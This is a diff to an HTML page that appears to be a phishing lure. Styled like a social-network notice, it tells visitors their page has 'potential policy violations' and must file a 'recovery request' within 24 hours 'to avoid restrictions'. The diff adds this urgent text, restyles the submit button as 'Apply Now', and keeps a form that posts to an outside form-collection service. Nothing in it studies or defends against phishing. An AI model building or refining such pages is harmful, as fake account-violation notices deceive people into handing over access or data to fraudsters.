@@ -12,30 +12,38 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
     }
     .box {
       background: #fff;
-      padding: 25px;
+      padding: 30px 20px;
       width: 100%;
-      max-width: 400px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      max-width: 450px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
       text-align: center;
     }
     h2 {
       margin-bottom: 20px;
+      font-size: 20px;
     }
-    button {
-      margin-top: 15px;
-      padding: 12px 20px;
+    p {
+      text-align: left;
+      font-size: 14px;
+      line-height: 1.5;
+      margin-bottom: 25px;
+    }
+    .apply-btn {
+      display: inline-block;
+      text-decoration: none;
       background: #1877f2;
       color: #fff;
-      border: none;
+      padding: 12px 25px;
       border-radius: 5px;
+      font-size: 16px;
       cursor: pointer;
-      font-size: 14px;
     }
-    button:hover {
+    .apply-btn:hover {
       background: #145dbf;
     }
   </style>
@@ -44,12 +52,21 @@
 
   <div class="box">
     <h2>⚠️ Important Notice</h2>
+    <p>
+      Our system has detected potential policy violations on your page.<br>
+      If you believe this is a mistake, you can submit a recovery request here.<br>
+      Please respond within 24 hours to avoid restrictions being applied.<br>
+      Thank you for your understanding.
+    </p>
 
     <form action="https://submit-form.com/09HQTNPsI" method="POST">
-      <!-- Message field with explicit <br> for line breaks -->
-      <input type="hidden" name="message" value="Our system has detected potential policy violations on your page.<br>If you believe this is a mistake, you can submit a recovery request here.<br>Please respond within 24 hours to avoid restrictions being applied.<br>Thank you for your understanding.">
-      
-      <button type="submit">Submit</button>
+      <!-- Fixed message sent to Formspark -->
+      <input type="hidden" name="message" value="Our system has detected potential policy violations on your page.
+If you believe this is a mistake, you can submit a recovery request here.
+Please respond within 24 hours to avoid restrictions being applied.
+Thank you for your understanding.">
+
+      <button type="submit" class="apply-btn">Apply Now</button>
     </form>
   </div>
 
